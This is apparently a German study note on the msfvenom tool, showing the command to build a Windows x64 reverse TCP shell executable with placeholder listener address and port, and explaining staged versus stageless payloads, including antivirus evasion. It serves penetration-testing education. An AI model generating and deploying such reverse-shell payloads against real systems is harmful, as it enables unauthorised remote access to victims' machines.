
# Generelle Infos 
*Der "einmal hin alles drin" Payload laden*

msfvenom ist Teil des Metasploit-Frameworks und wird verwendet, um Code für Reverse- und Bind-Shells zu generieren. Es wird häufig bei der Entwicklung von Exploits auf niedrigerer Ebene verwendet, um hexadezimalen Shellcode zu generieren, wenn z. B. ein Pufferüberlauf-Exploit entwickelt wird; es kann jedoch auch verwendet werden, um Payloads in verschiedenen Formaten zu generieren (z. B. .exe, .aspx, .war, .py)

Standard Syntax

```
msfvenom -p <Payload> <Options>
```

Beispiel anhand einer Windows x64 TCP Reverse shell

```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
Erklärung der Optionen:
-f <Format>
	 -> Spezifiziert den output hier auf eine *.exe
-o <file>
	-> Die Output Location und den Dateinamen der Generierten Payload
LHOST=<ip>
	-> Spezifiziert die IP für das Call Back der Reverse shell
LPORT=<port>
	-> Spezifiziert den Call back port meistens bei Metasploit 4444

# Staged und Stageless

Generell werden Payloads in zwei Konzepte unterteilt Staged und Stageless reverse shell payloads

### Staged

Gestufte Payloads werden in zwei Teilen gesendet. Der erste Teil wird als Stager bezeichnet. Dabei handelt es sich um einen Teil des Codes, der direkt auf dem Server selbst ausgeführt wird. Er stellt eine Verbindung zu einem wartenden Listener her, enthält aber selbst keinen Reverse-Shell-Code. Stattdessen verbindet er sich mit dem Listener und nutzt die Verbindung, um die eigentliche Payload zu laden, sie direkt auszuführen und zu verhindern, dass sie auf die Festplatte gelangt, wo sie von herkömmlichen Antivirenlösungen abgefangen werden könnte. So wird die Payload in zwei Teile aufgeteilt - einen kleinen anfänglichen Stager und dann den umfangreicheren Reverse-Shell-Code, der heruntergeladen wird, wenn der Stager aktiviert wird. Staged Payloads erfordern einen speziellen Listener - normalerweise den Metasploit Multi/Handler

### Stageless

Stagless Payloads sind gebräuchlicher - diese haben wir bis jetzt verwendet. Sie sind völlig eigenständig, da es nur ein Stück Code gibt, das bei Ausführung sofort eine Shell an den wartenden Hörer zurückschickt.


